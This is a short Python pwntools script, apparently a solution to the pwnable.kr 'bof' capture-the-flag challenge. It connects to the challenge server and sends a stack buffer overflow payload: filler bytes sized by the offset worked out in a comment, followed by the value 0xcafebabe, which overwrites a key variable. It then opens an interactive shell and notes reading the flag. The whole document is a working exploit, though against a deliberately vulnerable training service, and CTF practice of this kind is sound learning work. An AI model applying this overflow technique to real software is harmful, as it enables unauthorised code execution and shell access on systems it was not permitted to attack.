from pwn import *
r = remote('pwnable.kr', 9000)
# length of filler = (addr of key) - (addr of overflowme) = (ebp + 0x8) - (ebp - 0x2c) = 0x2c + 0x8
payload = bytearray([ord('a')] * (0x2c + 0x8))
payload.extend(p32(0xcafebabe))
print(payload)
r.sendline(payload)
r.interactive()
# now we have an interactive shell
# run cat flag to get the flag now
